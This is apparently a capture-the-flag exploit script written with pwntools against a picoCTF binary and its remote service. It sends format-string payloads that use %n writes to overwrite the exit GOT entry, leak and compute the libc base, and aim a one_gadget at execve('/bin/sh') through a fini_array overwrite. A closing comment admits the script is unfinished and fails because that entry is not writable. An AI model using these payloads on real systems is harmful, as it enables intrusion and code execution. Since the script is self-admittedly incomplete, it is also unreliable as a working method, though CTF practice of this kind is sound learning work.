from math import ceil
from pwn import *
elf = ELF("./vuln")
libc = ELF("./libc-2.31.so")

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *buy_stonks+229",
		# "b *buy_stonks+224",
		"c"
	]))
elif args.REMOTE:
	p = remote("mercury.picoctf.net", 5654)
else:
	p = process(elf.path) 


# loop program
p.sendlineafter(b'2) View my portfolio\n', b'1')
payload = '%c'* 10
payload += f'%{elf.got["exit"]-10}c%lln'
payload += f'%60205c%20$hn'
payload += 'SEPARATOR|%p|%p|%p|%p|%p|%p|%p|%p'
print(payload)
p.sendlineafter(b'What is your API token?\n', payload.encode())

p.recvuntil(b"SEPARATOR")
leak = p.recvline().split(b'|')[-1].strip(b'\n')
leak = int(leak.decode(), 16)
print(f'[+] leak:       {hex(leak)}')
libc.address = leak - 0x20b3
print(f'[+] libc_base:  {hex(libc.address)}')

# 4 write po 2 bytes
one_gadget = 0xe6c7e
one_gadget = libc.address + one_gadget
print(f'[+] one_gadget: {hex(one_gadget)}')

__do_global_dtors_aux_fini_array_entry = 0x601E18

def count_bytes(v):
	bl = v.bit_length()
	print(f'{v} {bl} {ceil(bl/8)}')
	return ceil(bl/8)

def closest_val(target, actual):
	print(f't: {hex(target)} ({count_bytes(target)})    v: {hex(actual)} ({count_bytes(actual)})')

	target_bytes = count_bytes(target)
	actual_bytes = count_bytes(actual)

	mask = (2**(target_bytes*8))-1
	print(f"Mask {hex(mask)}")

	actual_masked = actual & mask
	if actual_masked < target:
		return target - actual_masked

	return actual_masked + 2**(actual_bytes*8) - target_bytes



def write_dd(ptr, val):
	# find closest val
	p.sendlineafter(b'2) View my portfolio\n', b'1')
	payload = '%c'* 10
	payload += f'%{ptr-10}c%lln'
	payload += f'%{closest_val(val, ptr)}c%20$hn'
	print(payload)
	p.sendlineafter(b'What is your API token?\n', payload.encode())

write_dd(__do_global_dtors_aux_fini_array_entry, one_gadget & 0xFFFF)
# write_dd(__do_global_dtors_aux_fini_array_entry + 2, (one_gadget >> 8) & 0xFFFF)
# write_dd(__do_global_dtors_aux_fini_array_entry + 4, (one_gadget >> 16) & 0xFFFF)
# write_dd(__do_global_dtors_aux_fini_array_entry + 5, (one_gadget >> 24) & 0xFFFF)

# restore exit to trigger dtors

p.clean()
p.interactive()

# NOT FINISHED - __do_global_dtors_aux_fini_array_entry not writable, wtf

# 0xe6c7e execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe6c81 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe6c84 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe6e73 execve("/bin/sh", r10, r12)
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe6e76 execve("/bin/sh", r10, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [rdx] == NULL || rdx == NULL
